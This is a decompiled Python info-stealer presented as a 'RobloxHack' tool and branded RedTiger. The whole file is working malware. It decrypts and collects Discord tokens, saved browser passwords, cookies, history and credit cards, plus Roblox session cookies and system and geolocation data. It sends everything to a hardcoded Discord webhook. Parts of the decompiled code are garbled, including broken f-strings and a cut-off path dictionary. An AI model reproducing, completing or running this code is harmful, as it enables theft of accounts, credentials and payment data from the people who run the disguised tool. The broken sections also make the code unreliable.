# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: RobloxHack.py
# Bytecode version: 3.9.0beta5 (3425)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

webhook_url = 'https://discord.com/api/webhooks/1238118034846121984/cxoxKgSqyCpR37vocN_iXPDzl_jHT0ISqqGvlXgPbiFxyvMy0s6eYpCAKATYX4A6Y6m9'
import os
import platform
import ctypes
from screeninfo import *
import psutil
import GPUtil
import sqlite3
from urllib.request import Request, urlopen
import json
from json import *
import socket
import requests
from Crypto.Cipher import AES
import subprocess
import datetime
import base64
import re
import string
import win32api
import discord
from discord import Embed, File, SyncWebhook
import sys
import shutil
from pathlib import Path
from zipfile import ZipFile
from win32crypt import CryptUnprotectData
import uuid
from PIL import ImageGrab
import time
import browser_cookie3
import cv2
import pyautogui
import keyboard

def Block_Key():
    return

def Unblock_Key():
    return

def Block_Task_Manager():
    return

def Block_Mouse():
    return

def Block_Website():
    return

def Startup():
    return

def System_Grab():
    return

def Open_User_Profile_Settings():
    return

def Screenshot_Grab():
    return

def Camera_Capture_Grab():
    return

def Discord_Grab():
    return

def Browser_Grab():
    return

def Roblox_Grab():
    return

def Fake_Error():
    return

def current_time_day_hour():
    return datetime.datetime.now().strftime('%Y/%m/%d - %H:%M:%S')

def Clear():
    try:
        if sys.platform.startswith('win'):
            os.system('cls')
        else:  # inserted
            if sys.platform.startswith('linux'):
                os.system('clear')
    except:
        pass
Clear()
color_embed = 11665408
username_embed = 'RedTiger'
avatar_embed = 'https://media.discordapp.net/attachments/1184160374342299688/1223987317908181073/RedTiger_Logo.png?ex=661bda05&is=66096505&hm=c567e0e9e672ae70de44ddf128301ae0a6737d78a2f2a9f46ff9f2b717f0ac04&=&format=webp&quality=lossless&width=810&height=810'
footer_embed = {'text': f'Red Tiger | {current_time_day_hour()}', 'icon_url': avatar_embed}
footer_text = f'RedTiger | {current_time_day_hour()}'
try:
    hostname_pc = socket.gethostname()
except:
    hostname_pc = 'None'
try:
    username_pc = os.getlogin()
except:
    username_pc = 'None'
try:
    displayname_pc = win32api.GetUserNameEx(win32api.NameDisplay)
except:
    displayname_pc = 'None'
try:
    response = requests.get('https://httpbin.org/ip')
    ip_address_public = response.json()['origin']
except:
    ip_address_public = 'None'
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    ip_address_ipv4 = s.getsockname()[0]
    s.close()
except:
    ip_address_ipv4 = 'None'
try:
    ip_address_ipv6 = []
    all_interfaces = socket.getaddrinfo(socket.gethostname(), None)
    for interface in all_interfaces:
        if interface[0] == socket.AF_INET6:
            ip_address_ipv6.append(interface[4][0])
    ip_address_ipv6 = ' / '.join(ip_address_ipv6)
except:
    ip_address_ipv6 = 'None'
try:
    try:
        ipdatanojson = urlopen(Request(f'https://geolocation-db.com/jsonp/{ip_address_public}')).read().decode().replace('callback(', '').replace('})', '}')
        ipdata = loads(ipdatanojson)
    except:
        ipdatanojson = urlopen(Request(f'https://geolocation-db.com/jsonp/{ip_address_ipv6}')).read().decode().replace('callback(', '').replace('})', '}')
        ipdata = loads(ipdatanojson)
    try:
        country_code = ipdata['country_code'].lower()
    except:
        country_code = 'None'
except:
    country_code = 'None'
try:
    try:
        response = requests.get(f'http://ip-api.com/json/{ip_address_public}')
        data = response.json()
        status = data['status']
    except:
        response = requests.get(f'http://ip-api.com/json/{ip_address_ipv6}')
        data = response.json()
        status = data['status']
    if status in ['fail']:
        status = 'Invalid'
        ip_adress, country, country_code, region, region_code, city, zip_postal, latitude, longitude, timezone, isp, org, as_number, url_position = ('None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None')
    else:  # inserted
        status = 'Valid'
        ip_adress = data['query']
        country = data['country']
        region = data['regionName']
        region_code = data['region']
        city = data['city']
        zip_postal = data['zip']
        latitude = data['lat']
        longitude = data['lon']
        timezone = data['timezone']
        isp = data['isp']
        org = data['org']
        as_number = data['as']
        url_position = f'https://www.google.com/maps/search/?api=1&query={latitude},{longitude}'
except:
    ip_adress, country, region, region_code, city, zip_postal, latitude, longitude, timezone, isp, org, as_number, url_position = ('None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None')

def System_Grab():
    try:
        system_info = {platform.system()}
    except:
        system_info = 'None'
    try:
        system_version_info = platform.version()
    except:
        system_version_info = 'None'
    try:
        mac_address = ':'.join(['{:02x}'.format(uuid.getnode() >> elements & 255) for elements in range(0, 12, 2)][::(-1)])
    except:
        mac_address = 'None'
    try:
        hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except:
        hwid = 'None'
    try:
        ram_info = round(psutil.virtual_memory().total / 1073741824, 2)
    except:
        ram_info = 'None'
    try:
        cpu_info = platform.processor()
    except:
        cpu_info = 'None'
    try:
        cpu_core_info = psutil.cpu_count(logical=False)
    except:
        cpu_core_info = 'None'
    try:
        gpus = GPUtil.getGPUs()
        gpu_info = gpus[0].name if gpus else 'None'
    except:
        gpu_info = 'None'
    try:
        drives_info = []
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drive_path = letter + ':\\'
                try:
                    free_bytes = ctypes.c_ulonglong(0)
                    total_bytes = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(drive_path), None, ctypes.pointer(total_bytes), ctypes.pointer(free_bytes))
                    total_space = total_bytes.value
                    free_space = free_bytes.value
                    used_space = total_space - free_space
                    drive_name = win32api.GetVolumeInformation(drive_path)[0]
                    drive = {'drive': drive_path, 'total': total_space, 'free': free_space, 'used': used_space, 'name': drive_name}
                    drives_info.append(drive)
                except:
                    pass
            bitmask >>= 1
        disk_stats = '{:<7} {:<10} {:<10} {:<10} {:<20}\n'.format('Drive:', 'Free:', 'Total:', 'Use:', 'Name:')
        for drive in drives_info:
            use_percent = drive['used'] / drive['total'] * 100
            free_space_gb = '{:.2f}GO'.format(drive['free'] / 1073741824)
            total_space_gb = '{:.2f}GO'.format(drive['total'] / 1073741824)
            use_percent_str = '{:.2f}%'.format(use_percent)
            disk_stats += '{:<7} {:<10} {:<10} {:<10} {:<20}'.format(drive['drive'], free_space_gb, total_space_gb, use_percent_str, drive['name'])
    except:
        disk_stats = 'Drive:  Free:      Total:     Use:       Name:       \nNone    None       None       None       None     \n'
    try:
        directory = os.getcwd()
        disk_letter = os.path.splitdrive(directory)[0]
    except:
        disk_letter = 'None'
    try:
        def is_portable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False
        if is_portable():
            platform_info = 'Pc Portable'
        else:  # inserted
            platform_info = 'Pc Fixed'
    except:
        platform_info = 'None'
    try:
        def get_resolution():
            hdc = ctypes.windll.user32.GetDC(0)
            width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8)
            height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10)
            ctypes.windll.user32.ReleaseDC(0, hdc)
            return (width, height)
        for i, monitor in enumerate(get_monitors(), 1):
            if monitor.is_primary:
                width, height = get_resolution()
                name = monitor.name
                is_primary = 'Yes'
        main_screen = f'Name         : \"{name}\" \nResolution   : \"{width}x{height}\"\nMain Screen  : \"{is_primary}\"\n'
    except:
        main_screen = 'None'
    try:
        def get_resolution():
            hdc = ctypes.windll.user32.GetDC(0)
            width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8)
            height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10)
            ctypes.windll.user32.ReleaseDC(0, hdc)
            return (width, height)
        monitors = list(get_monitors())
        if len(monitors) > 1:
            second_monitor = monitors[1]
            width, height = get_resolution()
            second_screen = f'Name         : \"{name}\" \nResolution   : \"{width}x{height}\"\nMain Screen  : \"No\"\n'
        else:  # inserted
            second_screen = 'None'
    except:
        second_screen = 'None'

    def embed_system(webhook_url, title, fields, color, footer, username, avatar):
        embed_data = {'title': title, 'fields': fields, 'color': color, 'footer': footer, 'thumbnail': {'url': ''}}
        data = {'embeds': [embed_data], 'username': username, 'avatar_url': avatar}
        json_data = json.dumps(data)
        headers = {'Content-Type': 'application/json'}
        requests.post(webhook_url, data=json_data, headers=headers)
    title = f':computer: | System Info `{username_pc} \"{ip_address_public}\"`:'
    fields = [{'name': ':bust_in_silhouette: | User Pc:', 'value': f'```Name        : \"{hostname_pc}\"\nUsername    : \"{username_pc}\"\nDisplayName : \"{displayname_pc}\"```', 'inline': False}, {'name': ':computer: | System:', 'value': f'```Plateform    : \"{platform_info}\"\nExploitation : \"{system_info} {system_version_info}\"\n\nHWID : \"{hwid}\"\nMAC  : \"{mac_address}\"\nCPU  : \"{cpu_info}, {cpu_core_info} Core\"\nGPU  : \"{gpu_info}\"\nRAM  : \"{ram_info}Go\"```', 'inline': False}, {'name': ':satellite: | Ip:', 'value': f'{Go\"```}:satellite: | Ip:{```\nPublic : \"}ip_address_public{\"\nLocal  : \"}ip_address_ipv4{\"\nIpv6   : \"}ip_address_ipv6{\"\nIsp    : \"}isp', 'inline': False}, {'name': '\"\nOrg    : \"', 'value': f'org{\"\nAs     : \"}as_number{:minidisc: | Disk:}```{disk_stats}```', 'inline': False}, {'name': '```', 'value': f':minidisc: | Disk:{```}disk_stats{:desktop: | Screen:}```Main Screen:\n{main_screen}\n\nSecondary Screen:\n{second_screen}:flag_{country_code}: | Location:', 'inline': False},
    embed_system(webhook_url, title, fields, color_embed, footer_embed, username_embed, avatar_embed)

def Discord_Grab():
    class Discord:
        def __init__(self, webhook):
            upload_tokens(webhook).upload()

    class extract_tokens:
        def __init__(self) -> None:
            self.base_url = 'https://discord.com/api/v9/users/@me'
            self.appdata = os.getenv('localappdata')
            self.roaming = os.getenv('appdata')
            self.regexp = '[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}'
            self.regexp_enc = 'dQw4w9WgXcQ:[^\\\"]*'
            self.tokens, self.uids = ([], [])
            self.extract()

        def extract(self) -> None:
            paths = {'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\', 'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\', 'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\', 'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\', 'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\', 'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\', 'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\', 'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\', 'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\', 'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\', 'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\', '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\', 'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\', 'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\', 'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\', 'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\', '
            for name, path in paths.items():
                if not os.path.exists(path):
                    continue
                _discord = name.replace(' ', '').lower()
                if 'cord' in path:
                    if not os.path.exists(self.roaming + f'\\{_discord}\\Local State'):
                        continue
                    for file_name in os.listdir(path):
                        if file_name[(-3):] not in ['log', 'ldb']:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.regexp_enc, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{_discord}\\Local State'))
                                if self.validate_token(token):
                                    uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                    if uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)
                else:  # inserted
                    for file_name in os.listdir(path):
                        if file_name[(-3):] not in ['log', 'ldb']:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(self.regexp, line):
                                if self.validate_token(token):
                                    uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                    if uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)
            if os.path.exists(self.roaming + '\\Mozilla\\Firefox\\Profiles'):
                for path, _, files in os.walk(self.roaming + '\\Mozilla\\Firefox\\Profiles'):
                    for _file in files:
                        if not _file.endswith('.sqlite'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(self.regexp, line):
                                if self.validate_token(token):
                                    uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                    if uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)

        def validate_token(self, token: str) -> bool:
            r = requests.get(self.base_url, headers={'Authorization': token})
            if r.status_code == 200:
                return True
            return False

        def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:(-16)].decode()
            return decrypted_pass

        def get_master_key(self, path: str) -> str:
            if not os.path.exists(path):
                return
            if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
                return
            with open(path, 'r', encoding='utf-8') as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key

    class upload_tokens:
        def __init__(self, webhook: str):
            self.tokens = extract_tokens().tokens
            self.webhook = SyncWebhook.from_url(webhook)

        def upload(self):
            if not self.tokens:
                return
            for token_discord in self.tokens:
                user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token_discord}).json()
                try:
                    username_discord = user['username'] + '#' + user['discriminator']
                except:
                    username_discord = 'None'
                try:
                    display_name_discord = user['global_name']
                except:
                    display_name_discord = 'None'
                try:
                    user_id_discord = user['id']
                except:
                    user_id_discord = 'None'
                try:
                    email_discord = user['email']
                except:
                    email_discord = 'None'
                try:
                    phone_discord = user['phone']
                except:
                    phone_discord = 'None'
                try:
                    mfa_discord = user['mfa_enabled']
                except:
                    mfa_discord = 'None'
                try:
                    country_discord = user['locale']
                except:
                    country_discord = 'None'
                try:
                    if user['premium_type'] == 0:
                        nitro_discord = 'False'
                    else:  # inserted
                        if user['premium_type'] == 1:
                            nitro_discord = 'Nitro Classic'
                        else:  # inserted
                            if user['premium_type'] == 2:
                                nitro_discord = 'Nitro Boosts'
                            else:  # inserted
                                if user['premium_type'] == 3:
                                    nitro_discord = 'Nitro Basic'
                                else:  # inserted
                                    nitro_discord = 'False'
                except:
                    nitro_discord = 'None'
                try:
                    avatar_url_discord = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.png"
                except:
                    avatar_url_discord = avatar_embed
                try:
                    bio_discord = user['bio']
                    if not bio_discord.strip() or bio_discord.isspace():
                        bio_discord = 'None'
                except:
                    bio_discord = 'None'
                try:
                    guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token_discord})
                    if guilds_response.status_code == 200:
                        guilds = guilds_response.json()
                        try:
                            owner_guilds = [guild for guild in guilds if guild['owner']]
                            owner_guild_count = len(owner_guilds)
                            owner_guilds_names = []
                            if owner_guilds:
                                for guild in owner_guilds:
                                    owner_guilds_names.append(f"{guild['name']} ({guild['id']}) / ")
                                owner_guilds_names = '\n' + '\n'.join(owner_guilds_names)
                        except:
                            owner_guild_count = 'None'
                            owner_guilds_names = 'None'
                except:
                    owner_guild_count = 'None'
                    owner_guilds_names = 'None'
                try:
                    billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token_discord}).json()
                    if billing_discord:
                        payment_methods_discord = []
                        for method in billing_discord:
                            if method['type'] == 1:
                                payment_methods_discord.append('CB')
                            else:  # inserted
                                if method['type'] == 2:
                                    payment_methods_discord.append('Paypal')
                                else:  # inserted
                                    payment_methods_discord.append('Other')
                        payment_methods_discord = ' / '.join(payment_methods_discord)
                    else:  # inserted
                        payment_methods_discord = 'None'
                except:
                    payment_methods_discord = 'None'
                try:
                    gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token_discord}).json()
                    if gift_codes:
                        codes = []
                        for gift_codes_discord in gift_codes:
                            name = gift_codes_discord['promotion']['outbound_title']
                            gift_codes_discord = gift_codes_discord['code']
                            data = f'Gift: {name}\nCode: {gift_codes_discord}'
                            if len('\n\n'.join(gift_codes_discord)) + len(data) >= 1024:
                                break
                            gift_codes_discord.append(data)
                        if len(gift_codes_discord) > 0:
                            gift_codes_discord = '\n\n'.join(gift_codes_discord)
                        else:  # inserted
                            gift_codes_discord = 'None'
                    else:  # inserted
                        gift_codes_discord = 'None'
                except:
                    gift_codes_discord = 'None'
                embed = Embed(title=f':speech_balloon: | Discord Info `{username_pc} \"{ip_address_public}\"`:', color=color_embed)
                embed.set_thumbnail(url=avatar_url_discord)
                embed.add_field(name=':bust_in_silhouette: | Username:', value=f'```{username_discord}```', inline=True)
                embed.add_field(name=':bust_in_silhouette: | Display Name:', value=f'```{display_name_discord}```', inline=True)
                embed.add_field(name=':robot: | Id:', value=f'```{user_id_discord}```', inline=True)
                embed.add_field(name=':e_mail: | Email:', value=f'```{email_discord}```', inline=True)
                embed.add_field(name=':telephone_receiver: | Phone:', value=f'```{phone_discord}```', inline=True)
                embed.add_field(name=':globe_with_meridians: | Token:', value=f'```{token_discord}```', inline=True)
                embed.add_field(name=':rocket: | Nitro:', value=f'```{nitro_discord}```', inline=True)
                embed.add_field(name=':earth_africa: | Language:', value=f'```{country_discord}```', inline=True)
                embed.add_field(name=':moneybag: | Billing:', value=f'```{payment_methods_discord}```', inline=True)
                embed.add_field(name=':gift: | Gift Code:', value=f'```{gift_codes_discord}```', inline=True)
                embed.add_field(name=':lock: | Multi-Factor Authentication:', value=f'```{mfa_discord}```', inline=True)
                embed.add_field(name=':identification_card: | Bio:', value=f'```{bio_discord}```', inline=True)
                embed.add_field(name=f':link: | Owner Guilds ({owner_guild_count}):', value=f'```{owner_guilds_names}```', inline=True)
                embed.set_footer(text=footer_text, icon_url=avatar_embed)
                self.webhook.send(embed=embed, username=username_embed, avatar_url=avatar_embed)
    Discord(webhook_url)

def Browser_Grab():
    __LOGINS__ = []
    __COOKIES__ = []
    __WEB_HISTORY__ = []
    __DOWNLOADS__ = []
    __CARDS__ = []

    class Browser:
        def __init__(self, webhook):
            self.webhook = SyncWebhook.from_url(webhook)
            Chromium()
            Upload(self.webhook)

    class Upload:
        def __init__(self, webhook: SyncWebhook):
            self.webhook = webhook
            self.write_files()
            self.send()
            self.clean()

        def write_files(self):
            os.makedirs(f'Browsers_{username_pc}', exist_ok=True)
            if __LOGINS__:
                with open(f'Browsers_{username_pc}\\browsers_{username_pc}_passwords.txt', 'w', encoding='utf-8') as f:
                    f.write('\n'.join((str(x) for x in __LOGINS__)))
            if __COOKIES__:
                with open(f'Browsers_{username_pc}\\browsers_{username_pc}_cookies.txt', 'w', encoding='utf-8') as f:
                    f.write('\n'.join((str(x) for x in __COOKIES__)))
            if __WEB_HISTORY__:
                with open(f'Browsers_{username_pc}\\browsers_{username_pc}_history.txt', 'w', encoding='utf-8') as f:
                    f.write('\n'.join((str(x) for x in __WEB_HISTORY__)))
            if __DOWNLOADS__:
                with open(f'Browsers_{username_pc}\\browsers_{username_pc}_downloads.txt', 'w', encoding='utf-8') as f:
                    f.write('\n'.join((str(x) for x in __DOWNLOADS__)))
            if __CARDS__:
                with open(f'Browsers_{username_pc}\\browsers_{username_pc}_cards.txt', 'w', encoding='utf-8') as f:
                    f.write('\n'.join((str(x) for x in __CARDS__)))
            with ZipFile(f'Browsers_{username_pc}.zip', 'w') as zip:
                for file in os.listdir(f'Browsers_{username_pc}'):
                    zip.write(f'Browsers_{username_pc}\\{file}', file)

        def send(self):
            self.webhook.send(embed=Embed(title=f':globe_with_meridians: | Browsers Info `{username_pc} \"{ip_address_public}\"`:', description='```' + '\n'.join(self.tree(Path(f'Browsers_{username_pc}'))) + '```', color=color_embed).set_footer(text=footer_text, icon_url=avatar_embed), file=File(f'Browsers_{username_pc}.zip'), username=username_embed, avatar_url=avatar_embed)

        def clean(self):
            shutil.rmtree(f'Browsers_{username_pc}')
            os.remove(f'Browsers_{username_pc}.zip')

        def tree(self, path: Path, prefix: str='', midfix_folder: str='📂 - ', midfix_file: str='📄 - '):
            pipes = {'space': '    ', 'branch': '│   ', 'tee': '├── ', 'last': '└── '}
            if prefix == '':
                yield (midfix_folder + path.name)
            contents = list(path.iterdir())
            pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
            for pointer, path in zip(pointers, contents):
                if path.is_dir():
                    yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum((f.stat().st_size for f in path.glob('**/*') if f.is_file())) / 1024: kb)}"
                    extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
                    yield from self.tree(path, prefix=prefix + extension)
                else:  # inserted
                    yield f'{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)'

    class Chromium:
        def __init__(self):
            self.appdata = os.getenv('LOCALAPPDATA')
            self.browsers = {'amigo': self.appdata + '\\Amigo\\User Data', 'torch': self.appdata + '\\Torch\\User Data', 'kometa': self.appdata + '\\Kometa\\User Data', 'orbitum': self.appdata + '\\Orbitum\\User Data', 'cent-browser': self.appdata + '\\CentBrowser\\User Data', '7star': self.appdata + '\\7Star\\7Star\\User Data', 'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data', 'vivaldi': self.appdata + '\\Vivaldi\\User Data', 'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data', 'google-chrome': self.appdata + '\\Google\\Chrome\\User Data', 'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data', 'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data', 'uran': self.appdata + '\\uCozMedia\\Uran\\User Data', 'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data', 'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data', 'iridium': self.appdata + '\\Iridium\\User Data'}
            self.profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
            for _, path in self.browsers.items():
                if not os.path.exists(path):
                    continue
                self.master_key = self.get_master_key(f'{path}\\Local State')
                if not self.master_key:
                    continue
                for profile in self.profiles:
                    if not os.path.exists(path + '\\' + profile):
                        continue
                    operations = [self.get_login_data, self.get_cookies, self.get_web_history, self.get_downloads, self.get_credit_cards]
                    for operation in operations:
                        try:
                            operation(path, profile)
                        except:
                            pass

        def get_master_key(self, path: str) -> str:
            if not os.path.exists(path):
                return
            if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
                return
            with open(path, 'r', encoding='utf-8') as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key

        def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:(-16)].decode()
            return decrypted_pass

        def get_login_data(self, path: str, profile: str):
            login_db = f'{path}\\{profile}\\Login Data'
            if not os.path.exists(login_db):
                return
            shutil.copy(login_db, 'login_db')
            conn = sqlite3.connect('login_db')
            cursor = conn.cursor()
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or (not row[2]):
                    continue
                url = f'- [+] |URL|: {row[0]}'
                username = f'   |USERNAME|: {row[1]}'
                password = f'   |PASSWORD|: {self.decrypt_password(row[2], self.master_key)}'
                __LOGINS__.append(Types.Login(url, username, password))
            conn.close()
            os.remove('login_db')

        def get_cookies(self, path: str, profile: str):
            cookie_db = f'{path}\\{profile}\\Network\\Cookies'
            if not os.path.exists(cookie_db):
                return
            try:
                shutil.copy(cookie_db, 'cookie_db')
                conn = sqlite3.connect('cookie_db')
                cursor = conn.cursor()
                cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
                for row in cursor.fetchall():
                    if not row[0] or not row[1] or (not row[2]) or (not row[3]):
                        continue
                    url = f'- [+] |URL|: {row[0]}'
                    name = f'  |NAME|: {row[1]}'
                    path = f'  |PATH|: {row[2]}'
                    cookie = f'  |COOKIE|: {self.decrypt_password(row[3], self.master_key)}'
                    expire = f'  |EXPIRE|: {row[4]}'
                    __COOKIES__.append(Types.Cookie(url, name, path, cookie, expire))
                conn.close()
            except:
                pass
            os.remove('cookie_db')

        def get_web_history(self, path: str, profile: str):
            web_history_db = f'{path}\\{profile}\\History'
            if not os.path.exists(web_history_db):
                return
            shutil.copy(web_history_db, 'web_history_db')
            conn = sqlite3.connect('web_history_db')
            cursor = conn.cursor()
            cursor.execute('SELECT url, title, last_visit_time FROM urls')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or (not row[2]):
                    continue
                url = f'- [+] |URL|: {row[0]}'
                title = f'  |TITLE|: {row[1]}'
                time = f'  |TIME|: {row[2]}'
                __WEB_HISTORY__.append(Types.WebHistory(url, title, time))
            conn.close()
            os.remove('web_history_db')

        def get_downloads(self, path: str, profile: str):
            downloads_db = f'{path}\\{profile}\\History'
            if not os.path.exists(downloads_db):
                return
            shutil.copy(downloads_db, 'downloads_db')
            conn = sqlite3.connect('downloads_db')
            cursor = conn.cursor()
            cursor.execute('SELECT tab_url, target_path FROM downloads')
            for row in cursor.fetchall():
                if not row[0] or not row[1]:
                    continue
                path = f'- [+] |PATH|: {row[1]}'
                url = f'  |URL|: {row[0]}'
                __DOWNLOADS__.append(Types.Download(path, url))
            conn.close()
            os.remove('downloads_db')

        def get_credit_cards(self, path: str, profile: str):
            cards_db = f'{path}\\{profile}\\Web Data'
            if not os.path.exists(cards_db):
                return
            shutil.copy(cards_db, 'cards_db')
            conn = sqlite3.connect('cards_db')
            cursor = conn.cursor()
            cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or (not row[2]) or (not row[3]):
                    continue
                name = f'- [+] |NAME|: {row[0]}'
                expiration_month = f'  |EXPIRATION MOUNTH|: {row[1]}'
                expiration_year = f'  |EXPIRATION YEAR|: {row[2]}'
                card_number = f'  |CARD NUMBER|: {self.decrypt_password(row[3], self.master_key)}'
                date_modified = f'  |DATE MODIFIED|: {row[4]}'
                __CARDS__.append(Types.CreditCard(name, expiration_month, expiration_year, card_number, date_modified))
            conn.close()
            os.remove('cards_db')

    class Types:
        class Login:
            def __init__(self, url, username, password):
                self.url = url
                self.username = username
                self.password = password

            def __str__(self):
                return f'{self.url}\t{self.username}\t{self.password}'

            def __repr__(self):
                return self.__str__()

        class Cookie:
            def __init__(self, host, name, path, value, expires):
                self.host = host
                self.name = name
                self.path = path
                self.value = value
                self.expires = expires

            def __str__(self):
                return f"{self.host}\t{('FALSE' if self.expires == 0 else 'TRUE')}\t{self.path}\t{('FALSE' if self.host.startswith('.') else 'TRUE')}\t{self.expires}\t{self.name}\t{self.value}"

            def __repr__(self):
                return self.__str__()

        class WebHistory:
            def __init__(self, url, title, timestamp):
                self.url = url
                self.title = title
                self.timestamp = timestamp

            def __str__(self):
                return f'{self.url}\t{self.title}\t{self.timestamp}'

            def __repr__(self):
                return self.__str__()

        class Download:
            def __init__(self, tab_url, target_path):
                self.tab_url = tab_url
                self.target_path = target_path

            def __str__(self):
                return f'{self.tab_url}\t{self.target_path}'

            def __repr__(self):
                return self.__str__()

        class CreditCard:
            def __init__(self, name, month, year, number, date_modified):
                self.name = name
                self.month = month
                self.year = year
                self.number = number
                self.date_modified = date_modified

            def __str__(self):
                return f'{self.name}\t{self.month}\t{self.year}\t{self.number}\t{self.date_modified}'

            def __repr__(self):
                return self.__str__()
    Browser(webhook_url)

def Roblox_Grab():
    def get_cookie_and_navigator(browser_function):
        try:
            cookies = browser_function()
            cookies = str(cookies)
            cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            navigator = browser_function.__name__
            return (cookie, navigator)
        except Exception as e:
            return (None, None)

    def Edge():
        return browser_cookie3.edge(domain_name='roblox.com')

    def Chrome():
        return browser_cookie3.chrome(domain_name='roblox.com')

    def Firefox():
        return browser_cookie3.firefox(domain_name='roblox.com')

    def Opera():
        return browser_cookie3.opera(domain_name='roblox.com')

    def Safari():
        return browser_cookie3.safari(domain_name='roblox.com')

    def Brave():
        return browser_cookie3.brave(domain_name='roblox.com')
